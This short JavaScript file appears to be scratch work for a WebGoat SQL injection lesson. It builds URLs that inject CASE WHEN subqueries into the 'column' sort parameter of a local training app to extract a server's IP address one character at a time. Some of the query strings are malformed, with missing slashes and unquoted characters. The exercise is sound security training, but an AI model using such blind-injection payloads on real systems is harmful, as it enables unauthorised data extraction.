const alphabet = 'zxcvbnmasdfghjklqwertyuiop'
const alphIndex = 0
const ipIndex = 0
const query = `http:localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE WHEN EXISTS (SELECT if FROM servers WHERE hostname='webgoat-prd' and substring(ip, ${ipIndex + 1}, 1) = ${alphabet[alphIndex]}) )`

const queryNoDynamic = `http:localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+EXISTS+(SELECT+if+FROM+servers+WHERE+hostname='webgoat-prd'+and+substring(ip, 1, 1) = 'z'))`

const niceTry = `http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,2)+FROM+servers+WHERE+hostname=%27webgoat-prd%27)+=+%2710%27+THEN+id+ELSE+status+END)`